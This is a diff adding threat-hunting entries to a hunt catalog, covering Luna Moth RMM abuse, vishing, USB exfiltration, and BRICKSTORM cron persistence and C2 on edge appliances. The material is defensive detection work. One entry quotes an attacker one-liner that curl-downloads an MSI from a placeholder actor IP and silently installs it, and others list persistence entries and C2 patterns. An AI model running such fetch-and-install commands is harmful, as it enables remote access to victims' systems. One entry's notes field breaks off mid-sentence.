@@ -564,6 +564,68 @@ const HUNTS_DATA = [
     "file_path": "Embers/B020.md"
   },
   {
+    "id": "B021",
+    "category": "Embers",
+    "title": "What does legitimate external remote access actually look like in this org — which RMM / remote-support tools are sanctioned, from which hosts and paths they run, which users and source geographies use the SSL VPN / Citrix / Windows 365 VDI, and what BYOD-to-VDI patterns are normal — so that UNC3753 (Luna Moth) behaviors (an unsanctioned RMM installed during a screen-share, a VDI logon from a freshly compromised personal laptop, a burst of new external-remote-access sessions) stand out as outliers instead of drowning in normal remote-work noise.",
+    "tactic": "Persistence",
+    "notes": "Platform: Windows / M365 / network (self-managed and cloud VDI; applies to SSL VPN, Citrix, Windows 365, AVD, and RMM agents). Driven by Mandiant/GTIG \"Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms\" (UNC3753 / Luna Moth, June 5, 2026), where operators abused External Remote Services (T1133) — joining screen-shares, then pivoting through corporate VDI via native clients (`Windows365.exe`, Citrix) from compromised personal/BYOD laptops, and standing up RMM (AnyDesk, Bomgar, Zoho Assist, SuperOps) for persistence. Every primitive (VDI logon, RMM agent, remote session) also occurs constantly during legitimate remote work, so the malicious variant is only visible against a per-org baseline. **Data collection (30 days)** — (1) the **sanctioned RMM/remote-support inventory**: which products are approved, their normal install paths (`%ProgramFiles%`), signing certs, and the deployment mechanism that installs them; (2) per-user/per-host VDI and VPN access: source IP/ASN/geo, device-compliance/MFA state, client used (`Windows365.exe`, Citrix Workspace), normal logon hours; (3) RMM agent execution telemetry (Sysmon **Event ID 1** / Security **4688**: image, path, ParentImage, signer); (4) M365 sign-in logs / Unified Audit Log for remote-access app usage and new device registrations; (5) VPN/VDI gateway auth logs (success/volume per user). **Sources**: Sysmon 1/3, Security 4688/4624 (LogonType 10/Remote Interactive), MDE `DeviceProcessEvents`/`DeviceLogonEvents`, Entra ID sign-in logs, VPN/Citrix/Windows 365 gateway logs. **Build the allowlist**: the set of (approved RMM products + paths + signers), (normal VDI/VPN source ASNs/geos per user), and (expected remote-access logon patterns). **Deliverable format**: a per-user / per-host baseline of `(sanctioned remote-access tools, allowed install paths, normal VPN/VDI source IP-ASN-geo, normal hours, expected MFA/compliance state)`, plus a **block of patterns flagged immediately without waiting for baseline completion**: (a) any RMM/remote-access binary spawned by a collaboration app (`Teams.exe`/`Zoom.exe`/`quickassist.exe`) — see [[H182]]; (b) any RMM running from `%TEMP%`/`Downloads` instead of Program Files; (c) an RMM product **not** on the sanctioned list (AnyDesk/Bomgar/Zoho/SuperOps where unsanctioned); (d) VDI/VPN logon from a never-before-seen device or residential/foreign ASN for that user; (e) curl-delivered MSI installs of RMM — see [[H181]]. This baseline directly enables [[H181]] (curl->msiexec RMM) and [[H182]] (vishing->RMM) by letting them fire only on the genuinely unsanctioned/anomalous case. Cross-ref **T1219** (Remote Access Software), **T1021.001** (RDP/Terminal Services), **T1078** (Valid Accounts on the VDI pivot).",
+    "tags": [
+      "baseline",
+      "windows",
+      "m365",
+      "remote_services",
+      "rmm",
+      "vdi",
+      "vpn",
+      "luna_moth",
+      "T1133"
+    ],
+    "techniques": [
+      "T1133"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- External Remote Services is the hardest class of technique to alert on cold, because the malicious use is byte-for-byte the same action as a remote employee doing their job — an RMM agent, a VDI logon, a VPN session. The only thing that converts \"someone connected remotely\" into \"an attacker connected remotely\" is a baseline of what *this* org's sanctioned remote access looks like.\n- The single most generalizable signal the baseline establishes is the sanctioned-RMM inventory plus normal install paths and parents. Once that exists, Luna Moth's screen-share-installed RMM becomes a one-line outlier (unsanctioned product, wrong path, collab-app parent) that also catches whatever RMM the next intruder brings.\n- The baseline is what makes the paired Flames hunts ([[H181]], [[H182]]) operational rather than noisy: knowing which users legitimately use which remote tools, from which source ASNs and on which devices, lets those hunts fire only on the genuinely anomalous install or logon instead of on every help-desk session.\n- Remote-access infrastructure (VPN, Citrix, Windows 365, RMM) is high-value and heavily used, so a 30-day investment in baselining it pays back across the whole initial-access and persistence surface and survives campaign-specific rotation, because it describes the org's normal rather than chasing the current bad indicators.",
+    "references": "- [MITRE ATT&CK T1133 - External Remote Services](https://attack.mitre.org/techniques/T1133/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [MITRE ATT&CK T1219 - Remote Access Software](https://attack.mitre.org/techniques/T1219/)\n- [Red Canary - Detecting RMM software and other remote admin tools](https://redcanary.com/blog/threat-detection/rmm-software/)\n- [Intel 471 - Understanding and threat hunting for RMM software misuse](https://www.intel471.com/blog/understanding-and-threat-hunting-for-rmm-software-misuse)\n- [CISA - Guidance on protecting against the misuse of legitimate RMM software](https://www.cisa.gov/resources-tools/resources/protecting-against-malicious-use-remote-monitoring-and-management-software)\n- [Microsoft Learn - Entra ID sign-in logs and detecting anomalous remote access](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins)",
+    "file_path": "Embers/B021.md"
+  },
+  {
+    "id": "B022",
+    "category": "Embers",
+    "title": "What does legitimate management-plane access to this org's EDR-blind edge appliances (firewalls, NAS, Egnyte Storage Sync, VPN concentrators) actually look like — which accounts authenticate (including built-in/default service accounts like `egnyteservice`), from which source IPs, over which protocols (SSH/HTTPS-admin), at what times, and what the appliance's normal cron/rc/sudoers and outbound-network state is — so that VerdantBamboo (BRICKSTORM) behaviors (default-account SSH from the SSL VPN, a new cron/rc persistence entry, sudo-tee privesc, appliance-sourced web C2) stand out against a known-good baseline instead of hiding in devices nobody watches.",
+    "tactic": "Persistence",
+    "notes": "Platform: Linux / BSD network & storage appliances (firewall, NAS, Egnyte Storage Sync, VPN). Driven by Volexity \"VerdantBamboo: Just Another BRICKSTORM in the Firewall\" (June 4, 2026), where a Chinese actor abused **default/built-in accounts** (T1078.001 — the `egnyteservice` account with MSP-stolen, modified credentials) to SSH into appliances from the org web-based SSL VPN, then persisted via cron/rc and escalated through a misconfigured sudoers (`tee` as root). These appliances lack EDR, so the only way to detect the intrusion is a baseline of normal management access and normal device state. **Data collection (30 days, per appliance)** — (1) **authentication baseline**: every account that logs in (especially built-in/service accounts such as `egnyteservice`, `admin`, `root`), auth method (SSH key vs password), **source IP/ASN/geo**, and normal hours — appliance auth/SSH logs, VPN gateway logs, syslog; (2) **device-state snapshot**: known-good `/etc/crontab` + `/etc/cron.d/*` + `/etc/rc.d/*` contents, sudoers/sudoers.d rules, listening services, and installed-binary inventory (hash the vendor package tree); (3) **outbound network baseline**: the small set of vendor update/telemetry endpoints the appliance management IP legitimately contacts. **Sources**: appliance syslog / SSH auth logs, SSL VPN + firewall admin logs, NetFlow/Zeek from the appliance management VLAN, periodic config/FIM snapshots (osquery where supported). **Build the allowlist**: per appliance, the set of (expected admin accounts + auth methods + source IP-ASN-geo), the (known-good cron/rc/sudoers state), and the (allowed outbound destinations). **Deliverable format**: a per-appliance baseline of `(expected accounts, auth methods, normal source IPs/geo/hours, known-good cron+rc+sudoers hash, allowed outbound endpoints)`, plus a **block of patterns flagged immediately without waiting for baseline completion**: (a) a built-in/default service account (`egnyteservice` etc.) authenticating interactively or from the SSL VPN IP range — see T1078.001; (b) any change to `/etc/crontab`, `/etc/cron.d/*`, or `/etc/rc.d/*` — see [[H184]]; (c) any sudoers entry allowing a service account to run `tee`/editors as root (T1548.003); (d) any outbound WebSocket/HTTPS or DNS-over-HTTPS from an appliance management IP to a non-vendor (e.g. Cloudflare-fronted) destination — see [[H185]]; (e) appliance admin interface newly reachable from the public internet. This baseline directly enables [[H184]] (cron/rc persistence) and [[H185]] (BRICKSTORM web C2). Cross-ref **T1133** (External Remote Services — the SSL VPN as SSH source), **T1199** (Trusted Relationship — the MSP-compromise entry vector), **T1548.003** (sudo privesc), **T1037.004** (rc-script persistence).",
+    "tags": [
+      "baseline",
+      "linux",
+      "edge_appliance",
+      "firewall",
+      "nas",
+      "default_accounts",
+      "brickstorm",
+      "verdantbamboo",
+      "T1078.001"
+    ],
+    "techniques": [
+      "T1078.001"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- Edge appliances are the highest-value, least-instrumented hosts in most networks — they hold credentials, terminate VPNs, and route traffic, yet run no EDR — which is exactly why VerdantBamboo lived on them undetected for 18+ months. The only realistic detection strategy on an EDR-blind device is a baseline of normal management access and normal device state, then alerting on deviation.\n- Default and built-in service accounts (like `egnyteservice`) are the crux: they exist on every unit, rarely log in interactively, and are perfect for an attacker with stolen MSP credentials. Baselining which accounts authenticate, how, and from where turns \"a service account logged in over SSH from the VPN\" into a one-line high-signal alert instead of an invisible event.\n- The baseline is what makes the paired Flames hunts ([[H184]], [[H185]]) operational: a known-good snapshot of cron/rc/sudoers and of the appliance's tiny legitimate outbound profile lets persistence changes and web/DoH C2 stand out immediately, because the legitimate state of an appliance is far more static than that of a general-purpose host.\n- Investing in an appliance management-plane baseline pays back across the entire edge attack surface and survives this actor's per-device customization and C2 rotation, because it describes the org's normal device state and admin behavior rather than chasing rotating BRICKSTORM hashes and Cloudflare-fronted domains.",
+    "references": "- [MITRE ATT&CK T1078.001 - Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/)\n- [Volexity - VerdantBamboo: Just Another BRICKSTORM in the Firewall (source report)](https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/)\n- [CISA - Edge Device Security (best practices and hunting)](https://www.cisa.gov/topics/cybersecurity-best-practices/edge-device-security)\n- [CISA - Guidance and strategies to protect network edge devices](https://www.cisa.gov/resources-tools/resources/guidance-and-strategies-protect-network-edge-devices)\n- [Mandiant / Google Cloud - Another BRICKSTORM: Stealthy Backdoor Enabling Espionage into Tech and Legal Sectors](https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign)\n- [MITRE ATT&CK T1199 - Trusted Relationship](https://attack.mitre.org/techniques/T1199/)\n- [pberba - Hunting for Persistence in Linux (Part 1): Auditd, Sysmon, Osquery](https://pberba.github.io/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell/)",
+    "file_path": "Embers/B022.md"
+  },
+  {
     "id": "H001",
     "category": "Flames",
     "title": "An adversary is attempting to brute force the admin account on the externally facing VPN gateway.",
@@ -5724,6 +5786,173 @@ const HUNTS_DATA = [
     "file_path": "Flames/H180.md"
   },
   {
+    "id": "H181",
+    "category": "Flames",
+    "title": "Adversaries (UNC3753 / Luna Moth) use the Windows command shell to curl-download an RMM MSI and install it with `msiexec /i ... /quiet` after a vishing-driven screen-share, establishing remote access without traditional malware.",
+    "tactic": "Execution",
+    "notes": "Platform: Windows. Source: Mandiant/GTIG UNC3753 (Luna Moth / Silent Ransom Group) campaign against US law firms (June 5, 2026). Behavior: an operator who has the target screen-sharing pastes a one-liner that pulls an RMM MSI with curl and installs it silently — e.g. `curl -sL hxxp://<actor-ip>/installer -o \"SuperOps.msi\" && msiexec /i \"SuperOps.msi\" /quiet`. Detection: correlate the curl→msiexec sequence on one host within ~5 min. Sysmon Event ID 1 / Security 4688 for `curl.exe` whose command line carries a URL plus `-o`/`.msi`, immediately followed by `msiexec.exe` with `/i` + `/quiet`; Sysmon Event ID 3 / `DeviceNetworkEvents` for the curl HTTP(S) fetch to an IP/domain not owned by the RMM vendor; Sysmon Event ID 11 for the dropped `*.msi` in `%USERPROFILE%\\Downloads` or `%TEMP%`. KQL: `DeviceProcessEvents | where FileName==\"curl.exe\" and ProcessCommandLine has_any(\".msi\",\"-o\")` joined to `DeviceProcessEvents | where FileName==\"msiexec.exe\" and ProcessCommandLine contains \"/quiet\"` on `DeviceId` within 5m. Flag MSI source hosts not owned by the named RMM vendors (SuperOps, AnyDesk, BeyondTrust/Bomgar, Zoho Assist). Mandiant published Google SecOps rule \"Execute MSI Files Downloaded via Curl\" covering this exact chain. Cross-ref T1219 (Remote Access Software), T1569.002 (service install via msiexec), T1566.004 (the vishing initial access — see [[H182]]); baseline normal RMM/remote-access with [[B021]].",
+    "tags": [
+      "execution",
+      "rmm",
+      "msiexec",
+      "curl",
+      "luna_moth",
+      "windows",
+      "T1219",
+      "T1569.002",
+      "T1566.004",
+      "T1059.003"
+    ],
+    "techniques": [
+      "T1219",
+      "T1569.002",
+      "T1566.004",
+      "T1059.003"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- The whole point of the curl→`msiexec /quiet` chain is that every component is a signed, legitimate utility — `curl.exe` ships in-box, `msiexec.exe` is a trusted installer, and the RMM payload is a commercially code-signed MSI — so no single artifact looks malicious; the *sequence and source* are the tell, which is exactly what makes a correlation hunt the right tool.\n- This actor deploys data-theft extortion with no ransomware and no custom implant, so endpoint AV has almost nothing to fire on. Catching the install chain is often the earliest host-based opportunity to interdict the intrusion before bulk collection and exfil begin.\n- The behavior is highly detectable because legitimate software deployment in a managed enterprise almost never looks like an interactive user shelling out to `curl` to pull an MSI from a bare IP and silently installing it — sanctioned RMM arrives via the deployment tooling, not an ad-hoc one-liner during a Teams/Zoom call.\n- Anchoring on the curl→msiexec pattern (rather than on specific RMM names) generalizes: the same delivery one-liner catches whichever RMM the operator rotates to next, and the MSI-source allowlist check survives infrastructure churn.",
+    "references": "- [MITRE ATT&CK T1059.003 - Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [Red Canary - Detecting RMM software and other remote admin tools](https://redcanary.com/blog/threat-detection/rmm-software/)\n- [Intel 471 - Understanding and threat hunting for RMM software misuse](https://www.intel471.com/blog/understanding-and-threat-hunting-for-rmm-software-misuse)\n- [Microsoft Security Blog - Signed malware impersonating workplace apps deploys RMM backdoors](https://www.microsoft.com/en-us/security/blog/2026/03/03/signed-malware-impersonating-workplace-apps-deploys-rmm-backdoors/)\n- [LOLBAS - Msiexec.exe (living-off-the-land install/execute)](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)\n- [BleepingComputer - FBI warns of Luna Moth extortion attacks targeting law firms](https://www.bleepingcomputer.com/news/security/fbi-warns-of-luna-moth-extortion-attacks-targeting-law-firms/)",
+    "file_path": "Flames/H181.md"
+  },
+  {
+    "id": "H182",
+    "category": "Flames",
+    "title": "Adversaries (UNC3753 / Luna Moth) use spearphishing voice (vishing) posing as IT help desk to drive victims into a screen-share, then install RMM tools; hunt RMM/remote-access binaries spawned by collaboration apps plus access to privnote and lookalike help-desk domains.",
+    "tactic": "Initial Access",
+    "notes": "Platform: Windows / M365. Source: Mandiant/GTIG UNC3753 (Luna Moth) vs US law firms (June 5, 2026). T1566.004 itself (the phone call) is not in telemetry, so hunt the observable downstream chain: (1) an RMM / remote-access binary — `anydesk.exe`, `bomgar*`/`beyondtrust`, `zoho*`/`ZA_*`, SuperOps, `winscp.exe`, `rclone.exe` — whose ParentImage is a screen-share/collab app (`Teams.exe`, `ms-teams.exe`, `Zoom.exe`, `quickassist.exe`, `msra.exe`/Terminal Services) via Sysmon Event ID 1 / Security 4688; (2) RMM binary running from a non-standard path (`%USERPROFILE%\\Downloads`, `%TEMP%`) rather than `%ProgramFiles%`; (3) proxy/`DeviceNetworkEvents` hits to `privnote.com` (self-destructing install links/commands) and to lookalike help-desk domains (`<org>-itdesk[.]com`, `<org>-it[.]com`, `<org>-helpdesk[.]com`) from a user workstation; (4) M365 sign-in / UAL showing Quick Assist or new RMM access shortly after a flurry of Teams calls to a single user (report noted 5 Teams calls over 3 days). Mandiant Sigma keys on RMM `Image",
+    "tags": [
+      "T1566.004",
+      "T1219",
+      "T1204.002",
+      "T1059.003"
+    ],
+    "techniques": [
+      "T1566.004",
+      "T1219",
+      "T1204.002",
+      "T1059.003"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "#initial_access #T1566_004 #vishing #rmm #help_desk #luna_moth #windows",
+      "link": ""
+    },
+    "why": "- Vishing is invisible to almost every control — there is no link, no attachment, no malicious payload in email — so the phone call itself can never be hunted; the durable detection surface is the *consequence* on the endpoint and in M365, where an RMM tool suddenly appears as a child of the app the attacker used to talk the victim through installing it.\n- Parent-child lineage is the discriminator that separates malicious from sanctioned RMM: legitimate help-desk software is pushed by deployment tooling and runs from Program Files, whereas a victim-installed tool during a fake support call is launched interactively from a browser/collab process and runs from Downloads or Temp.\n- The actor's supporting infrastructure leaves complementary, low-false-positive web telemetry — `privnote.com` to pass self-destructing commands and `<org>-helpdesk[.]`-style lookalike domains — so correlating the host install chain with these network artifacts raises confidence well above either signal alone.\n- This is the signature entry technique of a financially motivated cluster actively hitting law and professional-services firms; detecting the post-call install gives responders a window to cut access before the bulk document collection (see [[M018]]) and exfil that follow within hours.",
+    "references": "- [MITRE ATT&CK T1566.004 - Phishing: Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [Unit 42 - Threat Assessment: Luna Moth Callback Phishing Campaign](https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/)\n- [Red Canary - You're invited: Four phishing lures in campaigns dropping RMM tools](https://redcanary.com/blog/threat-intelligence/phishing-rmm-tools/)\n- [Intel 471 - Understanding and threat hunting for RMM software misuse](https://www.intel471.com/blog/understanding-and-threat-hunting-for-rmm-software-misuse)\n- [BleepingComputer - Luna Moth extortion hackers pose as IT help desks to breach US firms](https://www.bleepingcomputer.com/news/security/luna-moth-extortion-hackers-pose-as-it-help-desks-to-breach-us-firms/)\n- [Dark Reading - FBI: Silent Ransom Group vishing law firms](https://www.darkreading.com/endpoint-security/fbi-silent-ransom-group-vishing-law-firms)",
+    "file_path": "Flames/H182.md"
+  },
+  {
+    "id": "H183",
+    "category": "Flames",
+    "title": "Adversaries (UNC3753 / Luna Moth) impersonating on-site IT technicians exfiltrate data to USB storage; hunt removable-device attach (PnP) followed by a burst of file copies to the device, especially on hosts that rarely use removable media.",
+    "tactic": "Exfiltration",
+    "notes": "Platform: Windows. Source: Mandiant/GTIG UNC3753 (Luna Moth) vs US law firms (June 5, 2026) — *\"individuals posing as IT technicians entered corporate offices to attempt direct exfiltration of data from an endpoint using USB storage media.\"* Detection (enable first): turn on Audit PNP Activity and Audit Removable Storage (off by default). Then hunt: Security Event ID 6416 (new external device recognized — capture VID/PID/serial) correlated with a burst of Event ID 4663 where Task Category = *Removable Storage* and `Accesses` = `WriteData`/`AppendData` (copy to USB) or large-volume `ReadData` from sensitive shares immediately before; Sysmon Event ID 11 (FileCreate) to a removable drive letter; MDE `DeviceEvents` `PnpDeviceConnected` + `DeviceFileEvents` writes to a removable volume. Stack 6416 (device) → 4663 (files) → 4624 (logon/user) to attribute. Immediate-flag patterns: copies to a USB serial never before seen in the estate; file-copy bursts to removable media from a workstation with no historical removable-media use; document-heavy copies (iManage exports, `.pdf`/`.docx`/`.xlsx` containing W-2/W-9/1099/SSN names) to USB; activity outside business hours. Cross-ref T1005 (Data from Local System), T1083 (the discovery that precedes — see [[M018]]); pairs with the org's removable-media baseline.",
+    "tags": [
+      "exfiltration",
+      "usb",
+      "removable_media",
+      "insider",
+      "luna_moth",
+      "windows",
+      "T1005",
+      "T1083",
+      "T1052.001"
+    ],
+    "techniques": [
+      "T1005",
+      "T1083",
+      "T1052.001"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- Physical USB exfil bypasses every network-egress control — DLP proxies, CASB, firewall — because the data never crosses the wire; the only durable evidence lives in host PnP and file-access auditing, which is precisely why those (default-off) audit policies must be enabled and hunted.\n- An attacker physically present as a \"technician\" is a deliberate evolution past the actor's usual remote tooling, and it specifically targets the highest-value, least-monitored moment — a logged-in workstation with a human walking the operator through it — so a removable-media hunt closes a gap that RMM and cloud-exfil hunts cannot see.\n- The behavior is detectable because removable-media write bursts are rare and bursty on most corporate endpoints: stacking device-attach against file-write volume per host makes a wholesale copy stand out sharply from the occasional legitimate USB use, and unseen device serials add a high-signal anomaly.\n- USB serials, copy volume, and off-hours timing are environment-stable signals that survive the actor changing personas or tooling, making this hunt resilient and reusable as a standing insider/physical-exfil detection rather than a one-campaign rule.",
+    "references": "- [MITRE ATT&CK T1052.001 - Exfiltration Over Physical Medium: Exfiltration over USB](https://attack.mitre.org/techniques/T1052/001/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [Microsoft Learn - Monitor the use of removable storage devices (Audit Removable Storage / 4663)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/monitor-the-use-of-removable-storage-devices)\n- [Netsurion - Tracking removable storage with the Windows Security Log](https://www.netsurion.com/articles/tracking-removable-storage-with-the-windows-security-log)\n- [ManageEngine - Event ID 6416: A new external device was recognized by the system](https://www.manageengine.com/products/active-directory-audit/process-tracking-events/event-id-6416.html)\n- [Insider Threat Matrix - DT099: Windows Event Log, Audit Removable Storage](https://insiderthreatmatrix.org/detections/DT099)\n- [Compass Security - Investigating data leakage via external storage devices](https://blog.compass-security.com/2019/04/investigating-data-leakage-via-external-storage-devices/)",
+    "file_path": "Flames/H183.md"
+  },
+  {
+    "id": "H184",
+    "category": "Flames",
+    "title": "Adversaries (VerdantBamboo) persist on edge/network appliances by adding/modifying cron entries (`/etc/crontab`, `/etc/cron.d/*`) to launch BRICKSTORM/AGENTPSD; hunt cron file creation/modification and cron-spawned execs from non-package binary paths on appliances.",
+    "tactic": "Persistence",
+    "notes": "Platform: Linux / BSD network & storage appliances. Source: Volexity \"VerdantBamboo: Just Another BRICKSTORM in the Firewall\" (June 4, 2026). Observed: `/etc/crontab` entry `20 14 15 * * root /usr/local/bin/egnyte/egnyte_host_monitor_client` (AGENTPSD, fires 15th of month 14:20); a manually created `/etc/cron.d/ssync` running `/home/egnyteservice/ssync.sh` then removed after execution; on the pfSense firewall a modified `/etc/rc.d/cron` to launch BRICKSTORM (`/usr/sbin/luserput`) at startup. Detection: file integrity / FIM and auditd watches on `/etc/crontab`, all `/etc/cron.*` (incl. `cron.d`), `/var/spool/cron/*`, and `/etc/rc.d/*` — alert on any create/modify (`auditd` `-w /etc/crontab -p wa`, etc.; note default FIM often only watches `/etc/crontab`, so add the rest). Hunt cron-spawned processes whose executable lives outside the appliance vendor package tree (e.g. `/usr/local/bin/egnyte/…`, `/usr/sbin/luserput`, `/home/<svc>/*.sh`); flag cron jobs created and deleted within a short window (anti-forensic churn). On platforms with osquery, diff the `crontab` table against a known-good appliance image. Cross-ref T1037.004 (RC Scripts — the `/etc/rc.d/cron` startup variant), T1548.003 (the misconfigured-sudo `tee`-as-root privesc that enabled the writes), and T1071.001 (BRICKSTORM C2 — see [[H185]]); appliance access baseline in [[B022]].",
+    "tags": [
+      "persistence",
+      "cron",
+      "brickstorm",
+      "edge_appliance",
+      "linux",
+      "verdantbamboo",
+      "T1037.004",
+      "T1548.003",
+      "T1071.001",
+      "T1053.003"
+    ],
+    "techniques": [
+      "T1037.004",
+      "T1548.003",
+      "T1071.001",
+      "T1053.003"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- Edge appliances are deliberately chosen for persistence because they lack EDR, so the attacker can hide for 18+ months — but they still run a standard Unix cron, which means cron file integrity and cron-spawned-process monitoring is one of the few high-signal detections actually available on these devices.\n- Cron persistence is detectable because a clean appliance's crontab and `cron.d` are near-static and vendor-defined: any new entry, any job pointing at a binary outside the package tree, or a job that appears and vanishes is a sharp deviation from a baseline that legitimate operation almost never produces.\n- Anchoring on cron/rc *modification* rather than on the specific BRICKSTORM/AGENTPSD hashes makes the hunt durable — the actor customizes and recompiles the backdoor per device and per C2 domain (Go, gobfuscate-obfuscated), so file hashes rotate while the persistence primitive (a cron line launching a non-package binary) stays constant.\n- The \"create then delete\" `/etc/cron.d/ssync` tradecraft is itself a tell: legitimate administration does not routinely add and immediately remove cron jobs, so flagging short-lived cron entries surfaces deliberately anti-forensic behavior that point-in-time inspection would miss.",
+    "references": "- [MITRE ATT&CK T1053.003 - Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)\n- [Volexity - VerdantBamboo: Just Another BRICKSTORM in the Firewall (source report)](https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/)\n- [MITRE ATT&CK T1037.004 - Boot or Logon Initialization Scripts: RC Scripts](https://attack.mitre.org/techniques/T1037/004/)\n- [Elastic - detection-rules: persistence_via_cron (hunting query)](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_cron.toml)\n- [Elastic Security Labs - Linux Detection Engineering: a primer on persistence mechanisms](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)\n- [pberba - Hunting for Persistence in Linux (Part 3): Systemd, Timers, and Cron](https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/)\n- [Mandiant / Google Cloud - Another BRICKSTORM: Stealthy Backdoor Enabling Espionage into Tech and Legal Sectors](https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign)",
+    "file_path": "Flames/H184.md"
+  },
+  {
+    "id": "H185",
+    "category": "Flames",
+    "title": "Adversaries (VerdantBamboo) run BRICKSTORM on edge appliances using WebSocket-over-HTTPS C2 to Cloudflare-fronted domains plus DNS-over-HTTPS to 8.8.8.8; hunt outbound web/DoH traffic sourced from appliance management IPs, which should be near-zero.",
+    "tactic": "Command and Control",
+    "notes": "Platform: Linux / BSD network & storage appliances (network-side detection). Source: Volexity \"VerdantBamboo: Just Another BRICKSTORM in the Firewall\" (June 4, 2026). Observed: BRICKSTORM (Go, `wssoft.core`/`wssoft.libs`) connects via HTTPS then upgrades to a WebSocket (`wss://…/api`) with task extensions `command` (remote shell), `socks` (SOCKS5 proxy), `web` (filesystem server); C2 fronted by Cloudflare IPs; DNS-over-HTTPS via TLS to Google `8.8.8.8`; AGENTPSD fallback POSTs with header `sec-fetch-tag:1<base64 sysinfo>`. Detection: the core anomaly is *any* established outbound web/DoH session whose source is an appliance management IP (firewall, NAS, Storage Sync) — inventory those IPs and alert on outbound 443/WebSocket/DoH that is not a known vendor update/telemetry endpoint. From network/firewall + Zeek logs: WebSocket `Upgrade` to Cloudflare-hosted hosts from an appliance; TLS to `8.8.8.8`/`8.8.4.4` (DoH) from an appliance; HTTP POSTs bearing the `sec-fetch-tag:1<base64>` header. Censys/host fingerprint for the C2 (Golang zero-length HTTP response, Cloudflare issuer, OpenBSD SSH present, <=4 services): `host.service_count<=4 AND host.services:(banner_hash_sha256:\"e28a96f983b8605decd2ac1db16ebad5fa741a6aa4e585a38ade0e5ad7d6cec0\" AND port=443) AND host.services.cert.parsed.issuer.organization=\"CloudFlare, Inc.\" AND host.services:(port=22 AND software.vendor:openbsd)`. Run Mandiant's BRICKSTORM scanner / YARA `G_APT_Backdoor_BRICKSTORM_3` on *nix appliances. Cross-ref T1572 / T1090.001 (the SOCKS5 proxy task), T1071.004 (the DoH resolution), and the cron persistence in [[H184]]; appliance baseline [[B022]].",
+    "tags": [
+      "command_and_control",
+      "brickstorm",
+      "websocket",
+      "doh",
+      "edge_appliance",
+      "verdantbamboo",
+      "T1572",
+      "T1090.001",
+      "T1071.004",
+      "T1071.001"
+    ],
+    "techniques": [
+      "T1572",
+      "T1090.001",
+      "T1071.004",
+      "T1071.001"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- An appliance's management interface has a tiny, predictable outbound profile — vendor updates and crash telemetry — so *any* established WebSocket-over-HTTPS or DoH session sourced from it is intrinsically anomalous; modeling \"appliance management IP talking to the internet\" turns a stealthy C2 channel into a high-signal, low-volume hunt.\n- BRICKSTORM deliberately blends into normal web traffic (HTTPS, nested TLS, WebSockets, Cloudflare fronting, DoH) precisely because appliances lack EDR and the operators expect host-based detection to be absent — which is exactly why the durable detection plane is the network egress from the appliance, not the appliance itself.\n- DNS-over-HTTPS from an appliance is a especially clean tell: legitimate appliances resolve via their configured resolvers, not by tunneling DNS inside TLS to 8.8.8.8, so flagging appliance-sourced DoH catches the C2 resolution step even when the WebSocket payload is fully encrypted.\n- Anchoring on the channel's structure (appliance-sourced web/WebSocket/DoH to non-vendor, Cloudflare-fronted infrastructure) rather than on specific domains or hashes makes the hunt resilient to the per-target customization and C2-domain rotation that define this actor, and it generalizes to other edge-device implants that adopt the same blend-in tradecraft.",
